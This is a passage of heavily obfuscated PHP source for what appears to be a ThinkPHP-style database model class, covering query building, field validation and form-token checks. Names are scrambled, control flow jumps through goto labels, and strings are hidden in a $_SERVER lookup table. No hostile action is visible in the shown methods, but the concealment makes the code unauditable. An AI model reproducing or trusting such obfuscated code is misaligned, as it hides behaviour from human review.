strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[274]) || !1 !== strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[275])) { $c¨¢”½ä[$EÂçÉ£¤±] = floatval($c¨¢”½ä[$EÂçÉ£¤±]); } elseif (!1 !== strpos($FÎ„ŒŒ„‚ , $Féñ‡‹ÈÛÆ[276])) { $c¨¢”½ä[$EÂçÉ£¤±] = (bool) $c¨¢”½ä[$EÂçÉ£¤±]; } } } public function find($C×ç‘»­ì = array()) { goto c¶Åµ·ÙÉ; c¶Åµ·ÙÉ: $Eµ ‚¹…Ì‘ =& $_SERVER[‘®…¢À]; if (is_numeric($C×ç‘»­ì) || is_string($C×ç‘»­ì)) { $fêÏÙ­©²×[$this->getPk()] = $C×ç‘»­ì; $this->options[$Eµ ‚¹…Ì‘[260]] = $fêÏÙ­©²×; } $this->options[$Eµ ‚¹…Ì‘[277]] = 1; goto eÀˆÁœ‚–ä; eÀˆÁœ‚–ä: $C×ç‘»­ì = $this->_parseOptions(); $A‰ç’†ë³ = $this->db->select($C×ç‘»­ì); if (!1 === $A‰ç’†ë³) { return !1; } goto E¯²²‰§ª; E¯²²‰§ª: if (empty($A‰ç’†ë³)) { return null; } $this->data = $A‰ç’†ë³[0]; $this->_afterFind($this->data, $C×ç‘»­ì); goto aëÉ­æ£Õ; aëÉ­æ£Õ: if (!empty($this->options[$Eµ ‚¹…Ì‘[278]])) { return $this->returnResult($this->data, $this->options[$Eµ ‚¹…Ì‘[278]]); } return $this->data; goto bÖ§Û¶ô·Ç; bÖ§Û¶ô·Ç: } protected function _afterFind(&$fô³¬Æöæ, $bÁ•œ¶‹Õ¦) { } protected function returnResult($Dö£ã‡…¡Ã, $f­Š£­ê‘ = '') { $DÕà×„õ… =& $_SERVER[‘®…¢À]; if ($f­Š£­ê‘) { if (is_callable($f­Š£­ê‘)) { return call_user_func($f­Š£­ê‘, $Dö£ã‡…¡Ã); } switch (strtolower($f­Š£­ê‘)) { case $DÕà×„õ…[279]: return json_encode($Dö£ã‡…¡Ã); case $DÕà×„õ…[280]: return xml_encode($Dö£ã‡…¡Ã); } } return $Dö£ã‡…¡Ã; } public function parseFieldsMap($cÜèğ©„Ï÷, $e„ƒŠÉä¸Ù = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Fä´è¤àŸ => $c¼£Åôªˆ†) { if ($e„ƒŠÉä¸Ù == 1) { if (isset($cÜèğ©„Ï÷[$c¼£Åôªˆ†])) { $cÜèğ©„Ï÷[$Fä´è¤àŸ] = $cÜèğ©„Ï÷[$c¼£Åôªˆ†]; unset($cÜèğ©„Ï÷[$c¼£Åôªˆ†]); } } else { if (isset($cÜèğ©„Ï÷[$Fä´è¤àŸ])) { $cÜèğ©„Ï÷[$c¼£Åôªˆ†] = $cÜèğ©„Ï÷[$Fä´è¤àŸ]; unset($cÜèğ©„Ï÷[$Fä´è¤àŸ]); } } } } return $cÜèğ©„Ï÷; } public function setField($Cİ®£ˆæé, $A–«…‹Û¿Ô = '') { if (is_array($Cİ®£ˆæé)) { $a‹Ó«Óï¸š = $Cİ®£ˆæé; } else { $a‹Ó«Óï¸š[$Cİ®£ˆæé] = $A–«…‹Û¿Ô; } return $this->save($a‹Ó«Óï¸š); } public function setAdd($EòÈ‘ğ¨«, $EëÑÛ·¶’Ø = 1) { $Fß›—ë—³Ö =& $_SERVER[‘®…¢À]; $Böæ•†–õÛ = $EòÈ‘ğ¨« . $Fß›—ë—³Ö[281] . $EëÑÛ·¶’Ø; if ($EëÑÛ·¶’Ø < 0) { $Böæ•†–õÛ = $EòÈ‘ğ¨« . $EëÑÛ·¶’Ø; } return $this->setField($EòÈ‘ğ¨«, array($Fß›—ë—³Ö[282], $Böæ•†–õÛ)); } public function getField($c¦ê™™äíõ, $CÅŠÛ‹ºƒõ = null) { $c˜Èø‰À‚¸ =& $_SERVER[‘®…¢À]; $eÒÌœ·µÇ[$c˜Èø‰À‚¸[258]] = $c¦ê™™äíõ; $eÒÌœ·µÇ = $this->_parseOptions($eÒÌœ·µÇ); $c¦ê™™äíõ = trim($c¦ê™™äíõ); if (strpos($c¦ê™™äíõ, $c˜Èø‰À‚¸[47])) { if (!isset($eÒÌœ·µÇ[$c˜Èø‰À‚¸[277]])) { $eÒÌœ·µÇ[$c˜Èø‰À‚¸[277]] = is_numeric($CÅŠÛ‹ºƒõ) ? $CÅŠÛ‹ºƒõ : $c˜Èø‰À‚¸[33]; } $AÕØ­¯‡‘ğ = $this->db->select($eÒÌœ·µÇ); if (!empty($AÕØ­¯‡‘ğ)) { goto D‹ºœÆùçĞ; D‹ºœÆùçĞ: $EóÆçòä© = explode($c˜Èø‰À‚¸[47], $c¦ê™™äíõ); $c¦ê™™äíõ = array_keys($AÕØ­¯‡‘ğ[0]); $C‡Ğİ£å×å = array_shift($c¦ê™™äíõ); goto c‹ì…»‰Ş‘; c‹ì…»‰Ş‘: $còŒˆšÑ™Ó = array_shift($c¦ê™™äíõ); $C±¶²Ç÷…§ = array(); $A«Œ²‡…¹ = count($EóÆçòä©); goto DÊ¿ÔÇ÷«Ë; DÊ¿ÔÇ÷«Ë: foreach ($AÕØ­¯‡‘ğ as $cÂ„Ö‹ãî†) { $Bï®•ì‡® = $cÂ„Ö‹ãî†[$C‡Ğİ£å×å]; if (2 == $A«Œ²‡…¹) { $C±¶²Ç÷…§[$Bï®•ì‡®] = $cÂ„Ö‹ãî†[$còŒˆšÑ™Ó]; } else { $C±¶²Ç÷…§[$Bï®•ì‡®] = is_string($CÅŠÛ‹ºƒõ) ? implode($CÅŠÛ‹ºƒõ, $cÂ„Ö‹ãî†) : $cÂ„Ö‹ãî†; } } return $C±¶²Ç÷…§; goto EÒí“×èî´; EÒí“×èî´: } } else { if (!0 !== $CÅŠÛ‹ºƒõ) { $eÒÌœ·µÇ[$c˜Èø‰À‚¸[277]] = is_numeric($CÅŠÛ‹ºƒõ) ? $CÅŠÛ‹ºƒõ : 1; } if ($CÅŠÛ‹ºƒõ === $c˜Èø‰À‚¸[240]) { unset($eÒÌœ·µÇ[$c˜Èø‰À‚¸[277]]); } $cÂ„Ö‹ãî† = $this->db->select($eÒÌœ·µÇ); if (!empty($cÂ„Ö‹ãî†)) { if ($CÅŠÛ‹ºƒõ === $c˜Èø‰À‚¸[240]) { return reset($cÂ„Ö‹ãî†[0]); } if (!0 !== $CÅŠÛ‹ºƒõ && 1 == $eÒÌœ·µÇ[$c˜Èø‰À‚¸[277]]) { return reset($cÂ„Ö‹ãî†[0]); } foreach ($cÂ„Ö‹ãî† as $F”ÃÂ‹ˆá) { $E¾ƒÔÒ´µ[] = $F”ÃÂ‹ˆá[$c¦ê™™äíõ]; } return $E¾ƒÔÒ´µ; } } return null; } public function create($C¾™«Ú­‡È = '', $Aéä¹Ëöíª = '') { goto cÈ‰Öá»¾¥; cÈ‰Öá»¾¥: $eÊÃÔÄ»Ù =& $_SERVER[‘®…¢À]; if (empty($C¾™«Ú­‡È)) { $C¾™«Ú­‡È = $_POST; } elseif (is_object($C¾™«Ú­‡È)) { $C¾™«Ú­‡È = get_object_vars($C¾™«Ú­‡È); } if (empty($C¾™«Ú­‡È) || !is_array($C¾™«Ú­‡È)) { $this->error = think_lang($eÊÃÔÄ»Ù[256]); return !1; } goto f÷Ñ¦èé¥×; f÷Ñ¦èé¥×: $C¾™«Ú­‡È = $this->parseFieldsMap($C¾™«Ú­‡È, 0); $Aéä¹Ëöíª = $Aéä¹Ëöíª ? $Aéä¹Ëöíª : (!empty($C¾™«Ú­‡È[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$eÊÃÔÄ»Ù[258]])) { $c”´à‘‡°Ë = $this->options[$eÊÃÔÄ»Ù[258]]; unset($this->options[$eÊÃÔÄ»Ù[258]]); } elseif ($Aéä¹Ëöíª == THINK_MODEL_INSERT && isset($this->insertFields)) { $c”´à‘‡°Ë = $this->insertFields; } elseif ($Aéä¹Ëöíª == THINK_MODEL_UPDATE && isset($this->updateFields)) { $c”´à‘‡°Ë = $this->updateFields; } goto eº ğÜÑè¼; a”ùĞ™öËÈ: return $C¾™«Ú­‡È; goto e­ÃùğÂ´; eº ğÜÑè¼: if (isset($c”´à‘‡°Ë)) { if (is_string($c”´à‘‡°Ë)) { $c”´à‘‡°Ë = explode($eÊÃÔÄ»Ù[47], $c”´à‘‡°Ë); } if (think_config($eÊÃÔÄ»Ù[283])) { $c”´à‘‡°Ë[] = think_config($eÊÃÔÄ»Ù[284]); } foreach ($C¾™«Ú­‡È as $C‰¥˜†ƒ…Æ => $C°ÆèØÆ³„) { if (!in_array($C‰¥˜†ƒ…Æ, $c”´à‘‡°Ë)) { unset($C¾™«Ú­‡È[$C‰¥˜†ƒ…Æ]); } } } if (!$this->autoValidation($C¾™«Ú­‡È, $Aéä¹Ëöíª)) { return !1; } if (!$this->autoCheckToken($C¾™«Ú­‡È)) { $this->error = think_lang($eÊÃÔÄ»Ù[285]); return !1; } goto A·ë‡Ø”½§; A·ë‡Ø”½§: if ($this->autoCheckFields) { $c”´à‘‡°Ë = $this->getDbFields(); foreach ($C¾™«Ú­‡È as $C‰¥˜†ƒ…Æ => $C°ÆèØÆ³„) { if (!in_array($C‰¥˜†ƒ…Æ, $c”´à‘‡°Ë)) { unset($C¾™«Ú­‡È[$C‰¥˜†ƒ…Æ]); } elseif (MAGIC_QUOTES_GPC && is_string($C°ÆèØÆ³„)) { $C¾™«Ú­‡È[$C‰¥˜†ƒ…Æ] = stripslashes($C°ÆèØÆ³„); } } } $this->autoOperation($C¾™«Ú­‡È, $Aéä¹Ëöíª); $this->data = $C¾™«Ú­‡È; goto a”ùĞ™öËÈ; e­ÃùğÂ´: } public function autoCheckToken($Aè ±¥Ç½) { $BË…œÎòâç =& $_SERVER[‘®…¢À]; if (isset($this->options[$BË…œÎòâç[286]]) && !$this->options[$BË…œÎòâç[286]]) { return !0; } if (think_config($BË…œÎòâç[283])) { $fîœö†ò¦® = think_config($BË…œÎòâç[284]); if (!isset($Aè ±¥Ç½[$fîœö†ò¦®]) || Session::get($fîœö†ò¦®)) { return !1; } list($D¿Ö¨ÁÄÅæ, $f“¢ŸøÌÅ) = explode($BË…œÎòâç[71], $Aè ±¥Ç½[$fîœö†ò¦®]); if ($f“¢ŸøÌÅ && Session::get($fîœö†ò¦® . $BË…œÎòâç[94] . $D¿Ö¨ÁÄÅæ) === $f“¢ŸøÌÅ) { Session::remove($fîœö†ò¦® . $BË…œÎòâç[94] . $D¿Ö¨ÁÄÅæ); return !0; } if (think_config($BË…œÎòâç[287])) { Session::remove($fîœö†ò¦® . $BË…œÎòâç[94] . $D¿Ö¨ÁÄÅæ); } return !1; } return !0; } public function regex($D®¶îÏœ°‡, $AÆèºêÖÁ) { $dÅŠÓ’ÓÃ£ =& $_SERVER[‘®…¢À]; $B˜¥¬—Õ±É = array($dÅŠÓ’ÓÃ£[288] => $dÅŠÓ’ÓÃ£[289], $dÅŠÓ’ÓÃ£[290] => $dÅŠÓ’ÓÃ£[291], $dÅŠÓ’ÓÃ£[292] => $dÅŠÓ’ÓÃ£[293], $dÅŠÓ’ÓÃ£[294] => $dÅŠÓ’ÓÃ£[295], $dÅŠÓ’ÓÃ£[296] => $dÅŠÓ’ÓÃ£[297], $dÅŠÓ’ÓÃ£[298] => $dÅŠÓ’ÓÃ£[299], $dÅŠÓ’ÓÃ£[300] => $dÅŠÓ’ÓÃ£[301], $dÅŠÓ’ÓÃ£[275] => $dÅŠÓ’ÓÃ£[302], $dÅŠÓ’ÓÃ£[303] => $dÅŠÓ’ÓÃ£[304]); if (isset($B˜¥¬—Õ±É[strtolower($AÆèºêÖÁ)])) { $AÆèºêÖÁ = $B˜¥¬—Õ±É[strtolower($AÆèºêÖÁ)]; } return preg_match($AÆèºêÖÁ, $D®¶îÏœ°‡) === 1; } private function autoOperation(&$c¬à³«Œ¾ê, $FÆ¹ìç«Ó£) { $Fª‘ø±‘„£ =& $_SERVER[‘®…¢À]; if (!empty($this->options[$Fª‘ø±‘„£[305]])) { $aÆÜ–†È†‹ = $this->options[$Fª‘ø±‘„£[305]]; unset($this->options[$Fª‘ø±‘„£[305]]); } elseif (!empty($this->_auto)) { $aÆÜ–†È†‹ = $this->_auto; } if (isset($aÆÜ–†È†‹)) { foreach ($aÆÜ–†È†‹ as $Fì‡°Òä›ˆ) { if (empty($Fì‡°Òä›ˆ[2])) { $Fì‡°Òä›ˆ[2] = THINK_MODEL_INSERT; } if ($FÆ¹ìç«Ó£ == $Fì‡°Òä›ˆ[2] || $Fì‡°Òä›ˆ[2] == THINK_MODEL_BOTH) { switch (trim($Fì‡°Òä›ˆ[3])) { case $Fª‘ø±‘„£[306]: case $Fª‘ø±‘„£[307]: $d–ÇÌ¢¿ãë = isset($Fì‡°Òä›ˆ[4]) ? (array) $Fì‡°Òä›ˆ[4] : array(); if (isset($c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]])) { array_unshift($d–ÇÌ¢¿ãë, $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]]); } if ($Fª‘ø±‘„£[306] == $Fì‡°Òä›ˆ[3]) { $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]] = call_user_func_array($Fì‡°Òä›ˆ[1], $d–ÇÌ¢¿ãë); } else { $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]] = call_user_func_array(array(&$this, $Fì‡°Òä›ˆ[1]), $d–ÇÌ¢¿ãë); } break; case $Fª‘ø±‘„£[258]: $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]] = $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[1]]; break; case $Fª‘ø±‘„£[308]: if ($Fª‘ø±‘„£[33] === $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]]) { unset($c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]]); } break; case $Fª‘ø±‘„£[309]: default: $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]] = $Fì‡°Òä›ˆ[1]; } if (!1 === $c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]]) { unset($c¬à³«Œ¾ê[$Fì‡°Òä›ˆ[0]]); } } } } return $c¬à³«Œ¾ê; } protected function autoValidation($aïïµñÆ‡Â, $DŒ–İå¦ğÙ) { $d´ˆë’Û»ì =& $_SERVER[‘®…¢À]; if (!empty($this->options[$d´ˆë’Û»ì[310]])) { $Fƒí÷„‘Æ‹ = $this->options[$d´ˆë’Û»ì[310]]; unset($this->options[$d´ˆë’Û»ì[310]]); } elseif (!empty($this->_validate)) { $Fƒí÷„‘Æ‹ = $this->_validate; } if (isset($Fƒí÷„‘Æ‹)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Fƒí÷„‘Æ‹ as $c¢Ù«¦‘”ã => $fï‘Õ¸Â©Ü) { if (empty($fï‘Õ¸Â©Ü[5]) || $fï‘Õ¸Â©Ü[5] == THINK_MODEL_BOTH || $fï‘Õ¸Â©Ü[5] == $DŒ–İå¦ğÙ) { if (0 == strpos($fï‘Õ¸Â©Ü[2], $d´ˆë’Û»ì[311]) && strpos($fï‘Õ¸Â©Ü[2], $d´ˆë’Û»ì[312])) { $fï‘Õ¸Â©Ü[2] = think_lang(substr($fï‘Õ¸Â©Ü[2], 2, -1)); } $fï‘Õ¸Â©Ü[3] = isset($fï‘Õ¸Â©Ü[3]) ? $fï‘Õ¸Â©Ü[3] : THINK_EXISTS_VALIDATE; $fï‘Õ¸Â©Ü[4] = isset($fï‘Õ¸Â©Ü[4]) ? $fï‘Õ¸Â©Ü[4] : $d´ˆë’Û»ì[313]; switch ($fï‘Õ¸Â©Ü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($aïïµñÆ‡Â, $fï‘Õ¸Â©Ü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($d´ˆë’Û»ì[33] != trim($aïïµñÆ‡Â[$fï‘Õ¸Â©Ü[0]])) { if (!1 === $this->_validationField($aïïµñÆ‡Â, $fï‘Õ¸Â©Ü)) { return !1; } } break; default: if (isset($aïïµñÆ‡Â[$fï‘Õ¸Â©Ü[0]])) { if (!1 === $this->_validationField($aïïµñÆ‡Â, $fï‘Õ¸Â©Ü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($d´óÌ›£‡, $cóÒŸÉ“¿·) { if (!1 === $this->_validationFieldItem($d´óÌ›£‡, $cóÒŸÉ“¿·)) { if ($this->patchValidate) { $this->error[$cóÒŸÉ“¿·[0]] = $cóÒŸÉ“¿·[2]; } else { $this->error = $cóÒŸÉ“¿·[2]; return !1; } } return; } protected function _validationFieldItem($E“˜­Úá±˜, $cÑ´¢¢ÌŒ¨) { $cÒ½ø‹‘İ =& $_SERVER[‘®…¢À]; switch (strtolower(trim($cÑ´¢¢ÌŒ¨[4]))) { case $cÒ½ø‹‘İ[306]: case $cÒ½ø‹‘İ[307]: $fŸÅŠ´‘ = isset($cÑ´¢¢ÌŒ¨[6]) ? (array) $cÑ´¢¢ÌŒ¨[6] : array(); if (is_string($cÑ´¢¢ÌŒ¨[0]) && strpos($cÑ´¢¢ÌŒ¨[0], $cÒ½ø‹‘İ[47])) { $cÑ´¢¢ÌŒ¨[0] = explode($cÒ½ø‹‘İ[47], $cÑ´¢¢ÌŒ¨[0]); } if (is_array($cÑ´¢¢ÌŒ¨[0])) { foreach ($cÑ´¢¢ÌŒ¨[0] as $EÖ»”ñ…‚Õ) { $F£Ù“ŒÜãº[$EÖ»”ñ…‚Õ] = $E“˜­Úá±˜[$EÖ»”ñ…‚Õ]; } array_unshift($fŸÅŠ´‘, $F£Ù“ŒÜãº); } else { array_unshift($fŸÅŠ´‘, $E“˜­Úá±˜[$cÑ´¢¢ÌŒ¨[0]]); } if ($cÒ½ø‹‘İ[306] == $cÑ´¢¢ÌŒ¨[4]) { return call_user_func_array($cÑ´¢¢ÌŒ¨[1], $fŸÅŠ´‘); } else { return call_user_func_array(array(&$this, $cÑ´¢¢ÌŒ¨[1]), $fŸÅŠ´‘); } case $cÒ½ø‹‘İ[314]: return $E“˜­Úá±˜[$cÑ´¢¢ÌŒ¨[0]] == $E“˜­Úá±˜[$cÑ´¢¢ÌŒ¨[1]]; case $cÒ½ø‹‘İ[315]: if (is_string($cÑ´¢¢ÌŒ¨[0]) && strpos($cÑ´¢¢ÌŒ¨[0], $cÒ½ø‹‘İ[47])) { $cÑ´¢¢ÌŒ¨[0] = explode($cÒ½ø‹‘İ[47], $cÑ´¢¢ÌŒ¨[0]); } $eçÓ²â”Èä = array(); if (is_array($cÑ´¢¢ÌŒ¨[0])) { foreach ($cÑ´¢¢ÌŒ¨[0] as $EÖ»”ñ…‚Õ) { $eçÓ²â”Èä[$EÖ»”ñ…‚Õ] = $E“˜­Úá±˜[$EÖ»”ñ…‚Õ]; } } else { $eçÓ²â”Èä[$cÑ´¢¢ÌŒ¨[0]] = $E“˜­Úá±˜[$cÑ´¢¢ÌŒ¨[0]]; } if (!empty($E“˜­Úá±˜[$this->getPk()])) { $eçÓ²â”Èä[$this->getPk()] = array($cÒ½ø‹‘İ[316], $E“˜­Úá±˜[$this->getPk()]); } if ($this->where($eçÓ²â”Èä)->find()) { return !1; } return !0; default: return $this->check($E“˜­Úá±˜[$cÑ´¢¢ÌŒ¨[0]], $cÑ´¢¢ÌŒ¨[1], $cÑ´¢¢ÌŒ¨[4]); } } public function check($BùšíùÃ×”, $A¶¼‰²¶«Ö, $FíÚ©‰×…è = "\162\145\147\x65\170") { $Aâ—œ’„Àİ =& $_SERVER[‘®…¢À]; $FíÚ©‰×…è = strtolower(trim($FíÚ©‰×…è)); switch ($FíÚ©‰×…è) { case $Aâ—œ’„Àİ[7]: case $Aâ—œ’„Àİ[317]: $Fªµò¿Ö¥´ = is_array($A¶¼‰²¶«Ö) ? $A¶¼‰²¶«Ö : explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö); return $FíÚ©‰×…è == $Aâ—œ’„Àİ[7] ? in_array($BùšíùÃ×”, $Fªµò¿Ö¥´) : !in_array($BùšíùÃ×”, $Fªµò¿Ö¥´); case $Aâ—œ’„Àİ[318]: case $Aâ—œ’„Àİ[319]: if (is_array($A¶¼‰²¶«Ö)) { $F¾ç½Èâ»Ş = $A¶¼‰²¶«Ö[0]; $bÏÉÆĞ¯ = $A¶¼‰²¶«Ö[1]; } else { list($F¾ç½Èâ»Ş, $bÏÉÆĞ¯) = explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö); } return $FíÚ©‰×…è == $Aâ—œ’„Àİ[318] ? $BùšíùÃ×” >= $F¾ç½Èâ»Ş && $BùšíùÃ×” <= $bÏÉÆĞ¯ : $BùšíùÃ×” < $F¾ç½Èâ»Ş || $BùšíùÃ×” > $bÏÉÆĞ¯; case $Aâ—œ’„Àİ[320]: case $Aâ—œ’„Àİ[321]: return $FíÚ©‰×…è == $Aâ—œ’„Àİ[320] ? $BùšíùÃ×” == $A¶¼‰²¶«Ö : $BùšíùÃ×” != $A¶¼‰²¶«Ö; case $Aâ—œ’„Àİ[322]: $E¥Öèöš² = mb_strlen($BùšíùÃ×”, $Aâ—œ’„Àİ[323]); if (strpos($A¶¼‰²¶«Ö, $Aâ—œ’„Àİ[47])) { list($F¾ç½Èâ»Ş, $bÏÉÆĞ¯) = explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö); return $E¥Öèöš² >= $F¾ç½Èâ»Ş && $E¥Öèöš² <= $bÏÉÆĞ¯; } else { return $E¥Öèöš² == $A¶¼‰²¶«Ö; } case $Aâ—œ’„Àİ[324]: list($DòÉóŸÇöò, $A²ÁÀ°õ´Ò) = explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö); if (!is_numeric($DòÉóŸÇöò)) { $DòÉóŸÇöò = strtotime($DòÉóŸÇöò); } if (!is_numeric($A²ÁÀ°õ´Ò)) { $A²ÁÀ°õ´Ò = strtotime($A²ÁÀ°õ´Ò); } return NOW_TIME >= $DòÉóŸÇöò && NOW_TIME <= $A²ÁÀ°õ´Ò; case $Aâ—œ’„Àİ[325]: return in_array(get_client_ip(), explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö)); case $Aâ—œ’„Àİ[326]: return !in_array(get_client_ip(), explode($Aâ—œ’„Àİ[47], $A¶¼‰²¶«Ö)); case $Aâ—œ’„Àİ[313]: default: return $this->regex($BùšíùÃ×”, $A¶¼‰²¶«Ö); } } public function query($bÃÍÏÙº¬é, $CÀ«ŒòçÓŠ = false) { $E’æîªñ¦ =& $_SERVER[‘®…¢À]; if (!is_bool($CÀ«ŒòçÓŠ) && !is_array($CÀ«ŒòçÓŠ)) { $CÀ«ŒòçÓŠ = func_get_args(); array_shift($CÀ«ŒòçÓŠ); } $bÃÍÏÙº¬é = str_replace(array($E’æîªñ¦[214], $E’æîªñ¦[327]), $E’æîªñ¦[50], $bÃÍÏÙº¬é); $bÃÍÏÙº¬é = $this->parseSql($bÃÍÏÙº¬é, $CÀ«ŒòçÓŠ); return $this->db->query($bÃÍÏÙº¬é); } public function execute($C˜¡Óç°ç, $E“§µÕÉö‹ = false) { if (!is_bool($E“§µÕÉö‹) && !is_array($E“§µÕÉö‹)) { $E“§µÕÉö‹ = func_get_args(); array_shift($E“§µÕÉö‹); } $C˜¡Óç°ç = $this->parseSql($C˜¡Óç°ç, $E“§µÕÉö‹); return $this->db->execute($C˜¡Óç°ç); } protected function parseSql($Aß©Â¨¶ß‹, $DÌ³Ñ­°Å¨) { $A¾êŸ§É˜ =& $_SERVER[‘®…¢À]; if (!0 === $DÌ³Ñ­°Å¨) { $Dİšà§ÔŸ‰ = $this->_parseOptions(); $Aß©Â¨¶ß‹ = $this->db->parseSql($Aß©Â¨¶ß‹, $Dİšà§ÔŸ‰); } elseif (is_array($DÌ³Ñ­°Å¨)) { $DÌ³Ñ­°Å¨ = array_map(array($this->db, $A¾êŸ§É˜[328]), $DÌ³Ñ­°Å¨); $Aß©Â¨¶ß‹ = vsprintf($Aß©Â¨¶ß‹, $DÌ³Ñ­°Å¨); } else { $Aß©Â¨¶ß‹ = strtr($Aß©Â¨¶ß‹, array($A¾êŸ§É˜[329] => $this->getTableName(), $A¾êŸ§É˜[330] => think_config($A¾êŸ§É˜[229]))); } $this->db->setModel($this->name); return $Aß©Â¨¶ß‹; } public function db($Dğ‚˜ÛÜè¬ = '', $d¿ÔØæªšµ = '', $f“îô¸Šˆß = array()) { goto B‚øİœØÑ›; D©­¤Ú’å: static $E°§ªßé„» = array(); if (!isset($E°§ªßé„»[$Dğ‚˜ÛÜè¬]) || isset($E°§ªßé„»[$Dğ‚˜ÛÜè¬]) && $d¿ÔØæªšµ && $DÑŸ»æšÌµ[$Dğ‚˜ÛÜè¬] != $d¿ÔØæªšµ) { if (!empty($d¿ÔØæªšµ) && is_string($d¿ÔØæªšµ) && !1 === strpos($d¿ÔØæªšµ, $b…‘Í·Ïó[8])) { $d¿ÔØæªšµ = think_config($d¿ÔØæªšµ); } $E°§ªßé„»[$Dğ‚˜ÛÜè¬] = Db::getInstance($d¿ÔØæªšµ); } elseif (NULL === $d¿ÔØæªšµ) { $E°§ªßé„»[$Dğ‚˜ÛÜè¬]->close(); unset($E°§ªßé„»[$Dğ‚˜ÛÜè¬]); return; } if (!empty($f“îô¸Šˆß)) { if (is_string($f“îô¸Šˆß)) { parse_str($f“îô¸Šˆß, $f“îô¸Šˆß); } foreach ($f“îô¸Šˆß as $F¡ÔÎŒ£‚ => $c÷ÏœåŠä•) { $this->setProperty($F¡ÔÎŒ£‚, $c÷ÏœåŠä•); } } goto BøŒŸµÊ”ë; f«ùàÊêŒ¡: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eçî°ë¾£²; B‚øİœØÑ›: $b…‘Í·Ïó =& $_SERVER[‘®…¢À]; if ($b…‘Í·Ïó[33] === $Dğ‚˜ÛÜè¬ && $this->db) { return $this->db; } static $DÑŸ»æšÌµ = array(); goto D©­¤Ú’å; BøŒŸµÊ”ë: $DÑŸ»æšÌµ[$Dğ‚˜ÛÜè¬] = $d¿ÔØæªšµ; $this->db = $E°§ªßé„»[$Dğ‚˜ÛÜè¬]; $this->_after_db(); goto f«ùàÊêŒ¡; eçî°ë¾£²: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $DÀÁ‰¬…™¼ = get_class($this); if ($DÀÁ‰¬…™¼ == $_SERVER[‘®…¢À][331]) { return $this->name; } $this->name = substr($DÀÁ‰¬…™¼, 0, -5); } return $this->name; } public function getTableName() { $bÛ—×Î™Òí =& $_SERVER[‘®…¢À]; if (empty($this->trueTableName)) { $B„œô‰ËÓ¥ = !empty($this->tablePrefix) ? $this->tablePrefix : $bÛ—×Î™Òí[33]; if (!empty($this->tableName)) { $B„œô‰ËÓ¥ .= $this->tableName; } else { $B„œô‰ËÓ¥ .= think_parse_name($this->name); } $this->trueTableName = strtolower($B„œô‰ËÓ¥); } return (!empty($this->dbName) ? $this->dbName . $bÛ—×Î™Òí[94] : $bÛ—×Î™Òí[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fÕ‚ğ¶É =& $_SERVER[‘®…¢À]; return isset($this->fields[$fÕ‚ğ¶É[236]]) ? $this->fields[$fÕ‚ğ¶É[236]] : $this->pk; } public function getDbFields() { $dä™ãÇ™ïæ =& $_SERVER[‘®…¢À]; if (isset($this->options[$dä™ãÇ™ïæ[264]])) { $dÊœàùÍ = $this->db->getFields($this->options[$dä™ãÇ™ïæ[264]]); return $dÊœàùÍ ? array_keys($dÊœàùÍ) : !1; } if ($this->fields) { $dÊœàùÍ = $this->fields; unset($dÊœàùÍ[$dä™ãÇ™ïæ[235]], $dÊœàùÍ[$dä™ãÇ™ïæ[236]], $dÊœàùÍ[$dä™ãÇ™ïæ[237]], $dÊœàùÍ[$dä™ãÇ™ïæ[234]]); return $dÊœàùÍ; } return !1; } public function data($Eç«µâ‚‘ò = '') { $FÑ…™œ‚¹ö =& $_SERVER[‘®…¢À]; if ($FÑ…™œ‚¹ö[33] === $Eç«µâ‚‘ò && !empty($this->data)) { return $this->data; } if (is_object($Eç«µâ‚‘ò)) { $Eç«µâ‚‘ò = get_object_vars($Eç«µâ‚‘ò); } elseif (is_string($Eç«µâ‚‘ò)) { parse_str($Eç«µâ‚‘ò, $Eç«µâ‚‘ò); } elseif (!is_array($Eç«µâ‚‘ò)) { think_exception(think_lang($FÑ…™œ‚¹ö[256])); } $this->data = $Eç«µâ‚‘ò; return $this; } public function join($C‰ÂğòßÓ) { $fÅòááâÕ =& $_SERVER[‘®…¢À]; if (is_array($C‰ÂğòßÓ)) { $this->options[$fÅòááâÕ[267]] = $C‰ÂğòßÓ; } elseif (!empty($C‰ÂğòßÓ)) { $this->options[$fÅòááâÕ[267]][] = $C‰ÂğòßÓ; } return $this; } public function union($DòŸ‡Â‡³Á, $bÄ´íµ²ê… = false) { goto B©øŒÅ¢’; CÈœ«¼›Ò¼: return $this; goto E†íİî¼Ô”; B©øŒÅ¢’: $Bè™¹å‡Ï =& $_SERVER[‘®…¢À]; if (empty($DòŸ‡Â‡³Á)) { return $this; } if ($bÄ´íµ²ê…) { $this->options[$Bè™¹å‡Ï[332]][$Bè™¹å‡Ï[333]] = !0; } goto eæÏ”Îƒ; eæÏ”Îƒ: if 